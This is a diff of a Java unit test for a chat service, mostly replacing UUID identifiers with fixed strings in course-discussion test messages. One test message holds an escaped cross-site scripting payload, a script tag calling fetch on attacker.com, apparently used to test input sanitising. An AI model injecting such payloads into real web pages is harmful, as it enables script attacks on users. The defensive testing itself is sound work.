@@ -21,7 +21,7 @@ import org.springframework.data.domain.Pageable;
 import java.util.Date;
 import java.util.List;
 import java.util.Optional;
-import java.util.UUID;
+ 
 
 import static org.junit.jupiter.api.Assertions.*;
 import static org.mockito.Mockito.*;
@@ -41,13 +41,13 @@ class ChatServiceTest {
     @InjectMocks
     private ChatService chatService;
 
-    private UUID chatRoomId;
-    private UUID userId;
+    private String chatRoomId;
+    private String userId;
 
     @BeforeEach
     void setup() {
-        chatRoomId = UUID.randomUUID();
-        userId = UUID.randomUUID();
+        chatRoomId = "chatRoom123";
+        userId = "user123";
     }
 
     @Test
@@ -59,8 +59,7 @@ class ChatServiceTest {
 
         ChatMessage savedMessage = new ChatMessage();
 
-        savedMessage.setId(UUID.randomUUID());
-
+ 
         savedMessage.setContent(
                 "Professor, could you clarify the assignment deadline?"
         );
@@ -126,8 +125,7 @@ class ChatServiceTest {
 
         ChatMessage savedMessage = new ChatMessage();
 
-        savedMessage.setId(UUID.randomUUID());
-
+ 
         savedMessage.setContent(
                 "&lt;script&gt;fetch('http://attacker.com')" +
                         "&lt;/script&gt;"
@@ -158,12 +156,12 @@ class ChatServiceTest {
     void shouldReturnOrderedDiscussionMessages() {
 
         ChatMessage msg1 = new ChatMessage();
-        msg1.setId(UUID.randomUUID());
+        
         msg1.setContent("Does anyone understand exercise 3?");
         msg1.setSentAt(new Date(System.currentTimeMillis() - 1000));
 
         ChatMessage msg2 = new ChatMessage();
-        msg2.setId(UUID.randomUUID());
+        
         msg2.setContent("Yes, the professor explained it in class yesterday.");
         msg2.setSentAt(new Date());
 
